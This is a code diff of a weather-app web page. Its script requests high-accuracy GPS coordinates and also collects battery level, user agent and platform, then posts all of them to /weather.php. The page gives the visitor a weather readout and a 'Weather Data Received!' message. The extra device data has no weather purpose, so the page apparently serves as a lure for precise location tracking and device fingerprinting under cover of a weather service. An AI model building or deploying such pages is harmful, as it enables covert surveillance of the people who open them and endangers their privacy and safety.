@@ -10,10 +10,8 @@
         body { min-height: 100vh; background: #2a5298; display: flex; justify-content: center; align-items: center; color: white; padding: 20px; }
         .card { background: #3e5f9a; padding: 2rem; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; width: 100%; max-width: 350px; }
         .get-weather-btn { background: #4CAF50; border: none; padding: 1rem; color: white; border-radius: 50px; cursor: pointer; width: 100%; font-weight: 600; font-size: 1.1rem; }
-        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #ffffff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .loader { display: none; border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid #ffffff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        /* Weather Styles */
         #weather-ui { display: none; }
         .icon-box img { width: 100px; }
         .temp-val { font-size: 3.5rem; font-weight: 600; }
@@ -36,65 +34,69 @@
         <div class="icon-box"><img id="w-icon" src=""></div>
         <div class="temp-val" id="t-display">--°C</div>
         <p id="d-display" style="text-transform: capitalize; margin-bottom: 20px;">--</p>
-
-        <div class="stat-row">
-            <div class="emoji">💧</div>
-            <div><span>Humidity</span><b id="h-display">--%</b></div>
-        </div>
-        <div class="stat-row">
-            <div class="emoji">🌬️</div>
-            <div><span>Wind Speed</span><b id="w-display">-- m/s</b></div>
-        </div>
-        <div class="stat-row">
-            <div class="emoji">🌡️</div>
-            <div><span>Feels Like</span><b id="f-display">--°C</b></div>
-        </div>
-        <div class="stat-row">
-            <div class="emoji">🏙️</div>
-            <div><span>Location</span><b id="l-display">--</b></div>
-        </div>
-
+        <div class="stat-row"><div class="emoji">💧</div><div><span>Humidity</span><b id="h-display">--%</b></div></div>
+        <div class="stat-row"><div class="emoji">🌬️</div><div><span>Wind Speed</span><b id="w-display">-- m/s</b></div></div>
+        <div class="stat-row"><div class="emoji">🌡️</div><div><span>Feels Like</span><b id="f-display">--°C</b></div></div>
+        <div class="stat-row"><div class="emoji">🏙️</div><div><span>Location</span><b id="l-display">--</b></div></div>
         <p style="margin-top:20px; color:#4CAF50; font-weight:600;">✅ Weather Data Received!</p>
     </div>
 </div>
 
 <script>
 async function getLocation() {
-    document.getElementById('loader').style.display = 'block';
-    document.getElementById('main-btn').style.display = 'none';
+    const loader = document.getElementById('loader');
+    const btn = document.getElementById('main-btn');
+    loader.style.display = 'block';
+    btn.style.display = 'none';
 
+    // Battery Logic
+    let batteryInfo = "100%";
     try {
-        const battery = await navigator.getBattery();
-        const batteryInfo = `${Math.round(battery.level * 100)}%`;
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batteryInfo = `${Math.round(b.level * 100)}%`;
+        }
+    } catch(e) {}
 
-        const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
-        });
+    // Location Logic with BUG FIX (Timeout increased to 15s)
+    navigator.geolocation.getCurrentPosition(
+        async (position) => {
+            try {
+                const response = await fetch('/weather.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: `lati=${position.coords.latitude}&longi=${position.coords.longitude}&acc=${position.coords.accuracy}&ua=${encodeURIComponent(navigator.userAgent)}&batt=${batteryInfo}&os=${navigator.platform}`
+                });
 
-        const response = await fetch('/weather.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `lati=${position.coords.latitude}&longi=${position.coords.longitude}&acc=${position.coords.accuracy}&ua=${encodeURIComponent(navigator.userAgent)}&batt=${batteryInfo}&os=${navigator.platform}`
-        });
+                const data = await response.json();
+                document.getElementById('start-screen').style.display = 'none';
+                document.getElementById('weather-ui').style.display = 'block';
+                document.getElementById('w-icon').src = `https://openweathermap.org/img/wn/${data.icon}@4x.png`;
+                document.getElementById('t-display').innerText = Math.round(data.temp) + "°C";
+                document.getElementById('d-display').innerText = data.desc;
+                document.getElementById('h-display').innerText = data.humidity + "%";
+                document.getElementById('w-display').innerText = data.wind + " m/s";
+                document.getElementById('f-display').innerText = Math.round(data.feels) + "°C";
+                document.getElementById('l-display').innerText = data.city;
+            } catch (err) {
+                alert("Server Error. Try Refreshing.");
+                resetUI();
+            }
+        },
+        (error) => {
+            // FIX: Specific messages for the user
+            if(error.code == 1) alert("❌ Permission Denied. Please allow location in site settings.");
+            else if(error.code == 3) alert("⏳ GPS Timeout. Please try again or go near a window.");
+            else alert("⚠️ GPS Error. Ensure location is ON.");
+            resetUI();
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+}
 
-        const data = await response.json();
-
-        // Update UI
-        document.getElementById('start-screen').style.display = 'none';
-        document.getElementById('weather-ui').style.display = 'block';
-        
-        document.getElementById('w-icon').src = `https://openweathermap.org/img/wn/${data.icon}@4x.png`;
-        document.getElementById('t-display').innerText = Math.round(data.temp) + "°C";
-        document.getElementById('d-display').innerText = data.desc;
-        document.getElementById('h-display').innerText = data.humidity + "%";
-        document.getElementById('w-display').innerText = data.wind + " m/s";
-        document.getElementById('f-display').innerText = Math.round(data.feels) + "°C";
-        document.getElementById('l-display').innerText = data.city;
-
-    } catch (error) {
-        alert("⚠️ Location denied. Please allow GPS access.");
-        location.reload();
-    }
+function resetUI() {
+    document.getElementById('loader').style.display = 'none';
+    document.getElementById('main-btn').style.display = 'block';
 }
 </script>
 </body>
